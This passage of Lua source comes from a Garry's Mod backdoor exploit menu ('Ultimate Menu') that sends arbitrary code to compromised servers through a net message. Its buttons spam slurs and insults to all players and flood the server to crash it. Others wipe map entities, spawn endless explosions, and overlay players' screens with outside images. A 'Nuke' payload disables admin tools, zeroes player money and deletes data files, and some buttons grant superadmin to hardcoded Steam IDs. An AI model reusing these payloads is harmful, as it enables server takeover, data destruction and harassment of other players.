draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 2 (base) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end



local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 650, 90)
Macro:SetTextColor ( blanc )
Macro:SetSize( 200, 25 )
Macro:SetText( "Ecran HACKED" )
Macro.Paint = function()
surface.SetDrawColor(rouge)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(1920,1080) hud:SetPos(0,0) hud:OpenURL(\"http://jesuschristoff.livehost.fr/gmod/upload/giphy2.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(1920,1080) hud4:SetPos(ScrW()-150,ScrH()-100) hud4:OpenURL(\"\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(1920,1080) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 3 (HACKED) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end

----------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 16, 10 )
Macro:SetTextColor( lil )
Macro:SetSize( 110, 10 )
Macro:SetText( "LES SPAMS" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Tu clique où la ?")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 18, 235 )
Macro:SetTextColor( chocolat )
Macro:SetSize( 110, 10 )
Macro:SetText( "LES MOUVEMENTS" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Tu clique où la ?")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 255, 530 )
Macro:SetTextColor( gaymen )
Macro:SetSize( 150, 10 )
Macro:SetText( "LES MESSAGES FORCÉ" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Tu clique où la ?")
end
local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 670, 10 )
Macro:SetTextColor( rouge )
Macro:SetSize( 150, 10 )
Macro:SetText( "LES RECOUVREURS D'ÉCRANS" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Tu clique où la ?")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 670, 150 )
Macro:SetTextColor( asuna )
Macro:SetSize( 150, 10 )
Macro:SetText( "UTILITAIRE SAVEBACKDOOR" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Ce nom te rappel le mood.lua ? :3 C'est un easter eggs mon clé :D + 1 Screen :D")
RunConsoleCommand ("screenshot")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 400, 10 )
Macro:SetTextColor( mer )
Macro:SetSize( 200, 10 )
Macro:SetText( "LES MANIPULATIONS DES JOUEURS" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Tu clique où la ?")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 160, 10 )
Macro:SetTextColor( vert )
Macro:SetSize( 200, 10 )
Macro:SetText( "LES MANIPULATIONS SERVEUR" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Tu clique où la ?")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 640, 320 )
Macro:SetTextColor( vert )
Macro:SetSize( 200, 10 )
Macro:SetText( "LES REBOOT / SHUTDOWN" )
Macro.Paint = function()
end
Macro.DoClick = function()
SploitNotify("Tu clique où la ?")
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam Seized" )
Macro.Paint = function()
surface.SetDrawColor(lil)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat1\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Seized fdp\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Spam 1 - Seized activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam - Bz fdp" )
Macro.Paint = function()
surface.SetDrawColor(lil)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat2\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Tu t'es bien fais niquer fais de pute ! :)\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Spam 2 - Bz fdp activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam - Get dicked" )
Macro.Paint = function()
surface.SetDrawColor(lil)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat3\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"Get dicked bitch\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Spam 3 - Get dicked activé" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam - Serv de merde" )			
Macro.Paint = function()
surface.SetDrawColor(lil)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat4\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"SERVEUR DE MERDE\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Spam 4 - Serveur de merde activé" )
    SploitNotify("Serveur de merde activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Spam - RIP" )
Macro.Paint = function()
surface.SetDrawColor(lil)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("timer.Create( \"tchat5\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"RIP RIP RIP RIP\")]]) end)")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Spam 5 - RIP activé	" )
    SploitNotify("SPAM activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Stop Spams" )
Macro.Paint = function()
surface.SetDrawColor(lil)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
timer.Remove ("tchat1")
timer.Remove ("tchat2")
timer.Remove ("tchat3")
timer.Remove ("tchat4")
timer.Remove ("tchat5")
]])
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Stop spam" )
    SploitNotify("SPAM désactivé")
    surface.PlaySound("buttons/blip1.wav") 
end

--[[]]
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 400, 120 ) 
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "2D Players" )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "2D Players activé" )
	    SploitNotify("2D players activé !")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(4,0,4)) 
        v:ManipulateBoneScale( b, Vector(0,0,0))
        v:ManipulateBoneScale( c, Vector(0,0,0))
        v:ManipulateBoneScale( d, Vector(0,0,1))
        v:ManipulateBoneScale( e, Vector(0,0,1))
        v:ManipulateBoneScale( f, Vector(0,0,0))
        v:ManipulateBoneScale( g, Vector(0,0,0))
        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
        v:ManipulateBoneScale( j, Vector(0,0,0))
        v:ManipulateBoneScale( k, Vector(0,0,0))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 160, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "10 millions toutes les 0.1sec" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10000000) end) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "10000000€ toutes les 0.1sec activé." )
    SploitNotify("MONEY MONEY MONEY")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 160, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Cleanup" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Map clean up." )
    SploitNotify("Map cleanup !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 650, 350 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Shutdown Serveur" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "timer.Create( \"spamlol\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"Owned by Jesus & Zilnix\") end end)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Arret..." )
    SploitNotify("RIP le serveur :)")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 160, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Armageddon" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local faggot = [[
            hook.Add("Think", "armageddon", function()
                local explode = ents.Create( "env_explosion" ) 
                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
                    explode:Spawn() 
                    explode:SetKeyValue( "iMagnitude", "500" ) 
                    explode:Fire( "Explode", 0, 0 ) 
                end)  
]]
net.Start(netKey)
net.WriteString( faggot )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Armageddon activé" )
    SploitNotify("Armageddon activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 160, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Nuke (Détruit Serveur)" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local nuke = [[
    if( LeyAC ) then
        LeyAC = nil;
    end

timer.Create( "next_level_timer2", 20, 0, function()
    --Break some bad cmds
    local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
    --Break ULX
    if ULib then
        for k,v in pairs(player.GetAll()) do
            ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
        end
 
        for k,v in pairs(ULib.ucl.groups) do
            if k != "user" then
                ULib.ucl.removeGroup(k);
            end
        end
 
        for k,v in pairs(ULib.ucl.users) do
            v.group = "user"
        end
    end
    --Gamemode related
    if GAMEMODE.Name == "DarkRP" then
 
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("rp_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
            RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
        end)
    end
 
    if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
        //for k, v in pairs(player.GetAll()) do
        //end
    end
 
    if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
            RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
        end)
     
        local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
     
        for k, v in pairs( fil ) do
            file.Delete( fil )
        end
    end
end)

if GetConVarnet.WriteString("sv_allowcslua") != "0" then
    RunConsoleCommand( "sv_allowcslua", "1" );
end

hook.Add("Think", "busted", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)

timer.Create( "next_level_timer", 5, 0, function()
    for k, v in pairs(player.GetAll()) do
        v:ConCommand("say Jesus & Zilnix are the best !");
    end
end)

RunConsoleCommand("hostname", "Seized by The God's")
RunConsoleCommand( "sv_loadingurl", "http://uu.esy.es/zyqv6r7n/seized.html" )
]]
net.Start(netKey)
net.WriteString( nuke )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "NUKE activé !" )
    SploitNotify("NUKE SERVEUR (ça fail mal)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 400, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Taille grande" )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(50.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( giant )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde grandit ! :o" )
    SploitNotify("Tout le monde est grand !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 400, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Taille petite" )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Tout le monde devient petit :o" )
    SploitNotify("Tout le monde devient petit")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 400, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Speedhack" )
Macro.Paint = function()
surface.SetDrawColor(mer)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(netKey)
net.WriteString( speedhack )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "ERREUR, CET EXPLOIT NE FONCTIONNE PAS ! Contacter Jesus christ si l'erreur persite." )
    SploitNotify("Speedhack activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 160, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Cancer" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )			
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
    timer.Create("cough", 10, 0, function()
        RunConsoleCommand("say", "*cough*")
        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
    end)
end
]])
net.WriteBit ( 1 )
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Cancer activé" )
    SploitNotify("Cancer activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 160, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Earthquake" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
net.Start(netKey)
net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end ")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Earthquake activé" )
    SploitNotify("Eathquake activé !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Devenir superadmin" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:219919521\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Jesuschrist_officiel" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:1:422795969\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:1:422795969 est superadmin" )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 200, 25 )
Macro:SetText( "Superadmin Zilnix" )
Macro.Paint = function()
surface.SetDrawColor(cyan)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"adduserid\", \"STEAM_0:0:162931507\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "STEAM_0:0:162931507 est superadmin" )
    SploitNotify("L'utilisateur est désormais superadmin")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 120 )
